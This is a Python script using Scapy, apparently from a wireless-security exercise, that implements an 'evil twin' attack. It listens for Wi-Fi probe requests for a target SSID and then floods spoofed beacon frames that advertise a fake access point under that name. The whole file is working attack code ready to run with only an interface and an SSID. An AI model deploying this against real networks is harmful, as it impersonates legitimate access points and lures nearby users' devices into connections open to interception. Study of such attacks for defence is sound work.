#!/usr/bin/env python3
from scapy.all import *
import argparse

# define variables    
interface = 0                                                      
ssid_wanted = 0
unique_ssid = []

# our packet handler        
# here we want to generate 1 evil twin per unique SSID corresponding to the SSID wanted by the user in the arguments     
# as soon as we get a probe request, we generate the attack and stop at this point
def phandle(p):                       
    if p.haslayer(Dot11ProbeReq):                         
        bssid = str(p.addr2)
        if p.haslayer(Dot11Elt):                          
            ssid = str(p.info.decode())
            if ssid == ssid_wanted and ssid not in unique_ssid:
                unique_ssid.append(ssid)
                print ("BSSID : %s SSID : %s" % (bssid, ssid))       
                evil_twin(bssid, ssid, 7)
            
            
# our evil twin generator
def evil_twin(bssid, ssid, channel):
    dot11 = Dot11(type=0, subtype=8, addr1='ff:ff:ff:ff:ff:ff',addr2=bssid, addr3=bssid)
    beacon = Dot11Beacon()
    essid = Dot11Elt(ID='SSID',info=ssid, len=len(ssid))
    channel_packet = Dot11Elt(ID='DSset', info=chr(channel))
    
    # prepare packet with all parameters
    packet = RadioTap()/dot11/beacon/essid/channel_packet
    
    print("\nPress Ctrl+C if you want to stop sending packets")
    
    # send packet
    sendp(packet, iface=interface, inter=0.100, loop=1)
                
# our main function             
if __name__ == "__main__":

	# managing arguments
    parser = argparse.ArgumentParser(description='A python script to generate a Probe Request Evil Twin attack')
    parser.add_argument('interface', action="store", help="specify a monitoring interface (ex. mon0)", default=False)
    parser.add_argument("ssid", action="store", help="Specify a ssid that you are looking for (ex. McDonald's)") 
    args = parser.parse_args()
    ssid_wanted = args.ssid
    interface = args.interface
    
    # sniffing the network and managing packets
    sniff(iface=args.interface,prn=phandle, store=0)                    
    print ("\n")
    print ("Exiting!")

        
   
